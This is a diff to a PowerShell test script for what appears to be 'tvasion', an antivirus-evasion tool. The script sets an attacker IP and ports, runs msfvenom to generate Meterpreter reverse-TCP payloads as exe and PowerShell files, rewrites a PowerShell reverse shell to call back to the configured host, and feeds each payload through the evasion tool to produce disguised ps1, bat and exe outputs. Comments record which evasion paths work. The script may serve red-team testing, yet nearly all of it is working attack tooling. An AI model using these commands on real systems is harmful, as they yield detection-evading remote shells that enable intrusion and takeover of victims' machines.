@@ -1,6 +1,10 @@
 #!/usr/bin/env pwsh
 
-# TODO add host + port reverse shell variables for comfortable tests, test all tvasion options
+# <configuration>
+$ip = "192.168.1.211";
+$port = 4242;
+$portMeterpreter = 4444;
+# </configuration>
 
 # get current script path
 function getScriptDirectory {
@@ -33,36 +37,31 @@ if ((Get-Command "msfconsole" -ErrorAction SilentlyContinue) -eq $null) {
     
     # use bash to create msfvenom, powershell do not support pipes for binary data
     write-output "tvasion: generate metasploit test payloads. This will take some time..." 
-    $msfvenomExe = "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format exe LHOST=192.168.1.211 LPORT=4444 > $($__rootPath)/out/Meterpreter_amd64.exe"
+    $msfvenomExe = "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format exe LHOST=$($ip) LPORT=$($portMeterpreter) > $($__rootPath)/out/Meterpreter_amd64.exe"
     bash -c "$($msfvenomExe)";
-    $msfvenomPsh =  "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format psh LHOST=192.168.1.211 LPORT=4444 > $($__rootPath)/out/Meterpreter_psh.ps1"
+    $msfvenomPsh =  "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format psh LHOST=$($ip) LPORT=$($portMeterpreter) > $($__rootPath)/out/Meterpreter_psh.ps1"
     bash -c "$($msfvenomPsh)";
 
 }
 
-# compile reverse shells
-#mcs "$($__rootPath)/tests/ReverseShell.cs" -platform:x86 -out:"$($__rootPath)/out/ReverseShellc#_x86.exe"
-write-output "tvasion: compile C# test payload. This will take some time..." 
-mcs "$($__rootPath)/tests/ReverseShell.cs" -platform:x64 -out:"$($__rootPath)/out/ReverseShellc#_amd64.exe"
-
-# copy powershell reverse shell in test used in ./out/
-iex "cp $($__rootPath)/tests/ReverseShell.ps1 $($__rootPath)/out/ReverseShell.ps1"
+# copy powershell reverse shell in /.out/, replace host and port
+$pwshReverse = Get-Content -raw  "$($__rootPath)/tests/ReverseShell.ps1";
+$pwshReverse = $pwshReverse -replace 'TCPClient\("[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+", [0-9]+\);', "TCPClient(`"$($ip)`", $($port));"
+$pwshReverse > "$($__rootPath)/out/ReverseShell.ps1"
 
 ##
 ## see below whats works, what not
 ##
 
-# TODO all ps1 defect
 write-output "output -t ps1:"
 iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1ps1_shell" # works
-iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeps1_shell" # doesn't work with all files, special binary required
+#iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeps1_shell" # doesn't work with all files, special binary required
 if ($meterpreter) {
     iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1ps1_meterpreterpsh" # works
     iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeps1_meterpreter" # works
     #iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/Meterpreter_x86.exe -o $($__rootPath)/out/exeps1_meterpreterx86" # untested
 }
 
-# TODO all ps1 defect
 write-output "output -t bat:"
 iex "$($__rootPath)/tvasion.ps1 -d -t bat $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1bat_shell" # works
 if ($meterpreter) {
@@ -72,7 +71,7 @@ if ($meterpreter) {
 
 write-output "output -t exe:"
 iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1exe_shell" # works
-iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeexe_shell" # doesn't work with all files, special binary required
+#iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeexe_shell" # doesn't work with all files, special binary required
 if ($meterpreter) {
     iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1exe_meterpreterpsh" # works maybe: requires small payload size restriction of arguments length of process.startupinfo.arguments
     iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeexe_meterpreter" # works
